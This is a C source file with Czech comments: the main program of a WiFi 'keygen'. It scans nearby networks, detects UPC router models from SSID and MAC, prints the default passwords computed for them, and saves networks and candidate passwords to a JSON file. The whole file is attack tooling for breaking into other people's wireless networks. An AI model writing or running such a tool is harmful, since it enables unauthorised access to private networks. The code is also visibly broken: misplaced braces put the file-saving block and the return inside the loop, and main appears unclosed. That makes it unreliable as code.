#include <stdio.h>
#include "wifitypes.h"
#include "scan.h"
#include "wifisort.h"
#include "passgen.h"

typedef struct {
    char ssid[64];
    char mac[32];
    int signal;
    char passwords[8][32]; // Max 8 hesel, totéž jako v keygenu
    int pass_count;
} WifiResult;

int main() {
    printf("Vítejte v keygenu\n");

    Network networks[MAX_NETWORKS];
    Network filtered[MAX_NETWORKS];
    int count, fcount = 0;

    printf("Skenuji okolní WiFi sítě...\n");
    count = scan_wifi(networks);

    if (count == 0) {
        printf("Žádná WiFi síť nenalezena.\n");
        printf("Ukončuji keygen\n");
        return 0;
    }

     printf("Nalezeno %d WiFi sítí:\n", count);
     for (int i = 0; i < count; ++i) {
          printf("  SSID: %s\n  MAC: %s\n  Síla signálu: %d dBm\n\n",
                 networks[i].ssid,
                 networks[i].mac,
                 networks[i].signal);
    }

    // Filtrování
    for (int i = 0; i < count; ++i) {
        KeygenType tkg = detect_keygen(&networks[i]);
        if (tkg != NONE) {
            filtered[fcount++] = networks[i];
        }
    }

    if (fcount == 0) {
        printf("Žádná kompatibilní síť nenalezena.\n");
        printf("Ukončuji keygen\n");
        return 0;
    }

    WifiResult results[MAX_NETWORKS];
    int results_count = 0;

    for (int i = 0; i < fcount; ++i) {
    printf("\nSSID: %s\nMAC: %s\nSíla signálu: %d dBm\nMožná hesla:\n", 
        filtered[i].ssid, filtered[i].mac, filtered[i].signal);
    KeygenType tkg = detect_keygen(&filtered[i]);

    WifiResult wres;
    snprintf(wres.ssid, sizeof(wres.ssid), "%s", filtered[i].ssid);
    snprintf(wres.mac, sizeof(wres.mac), "%s", filtered[i].mac);
    wres.signal = filtered[i].signal;
    wres.pass_count = 0;

    if (tkg == UPC07UBEE) {
        char upcpass[32];
        upc07ubee_generate_pass(filtered[i].mac, upcpass);
        printf("  [Upc07UbeeKeygen] %s\n", upcpass);

        snprintf(wres.passwords[wres.pass_count++], sizeof(wres.passwords[0]), "%s", upcpass);
    }
    if (tkg == UPC07) {
        // Najdi všechna možná hesla!
        char passes[8][9];   // Každé heslo má 8 znaků + '\0', maximálně 8 variant (reálně bývají 1-4)
        int n = upc07keygen_multi(filtered[i].ssid, passes, 8);
        if (n == 0) {
            printf("  [Upc07Keygen] Není nalezeno žádné heslo!\n");
        } else {
            for (int j = 0; j < n; ++j) {
                printf("  [Upc07Keygen %d] %s\n", j+1, passes[j]);
                snprintf(wres.passwords[wres.pass_count++], sizeof(wres.passwords[0]), "%s", passes[j]);
           }
        }
     }
     if (wres.pass_count > 0) {
        results[results_count++] = wres;
  }

   // Uložení do JSON souboru
     FILE *json = fopen("wifi_results.json", "w");
     if (!json) {
        printf("Chyba při otevírání wifi_results.json pro zápis!\n");
    } else {
         fprintf(json, "[\n");
        for (int i = 0; i < results_count; ++i) {
           fprintf(json, "  {\n");
           fprintf(json, "    \"ssid\": \"%s\",\n", results[i].ssid);
           fprintf(json, "    \"mac\": \"%s\",\n", results[i].mac);
           fprintf(json, "    \"signal\": %d,\n", results[i].signal);
           fprintf(json, "    \"passwords\": [");
           for (int j = 0; j < results[i].pass_count; ++j) {
               fprintf(json, "\"%s\"%s", results[i].passwords[j], (j+1 == results[i].pass_count) ? "" : ", ");
            }
            fprintf(json, "]\n");
            fprintf(json, "  }%s\n", (i+1 == results_count) ? "" : ",");
        }
    fprintf(json, "]\n");
    fclose(json);

    printf("Výsledky byly uloženy do wifi_results.json\n");
}

     printf("Ukončuji keygen\n");
     return 0;
}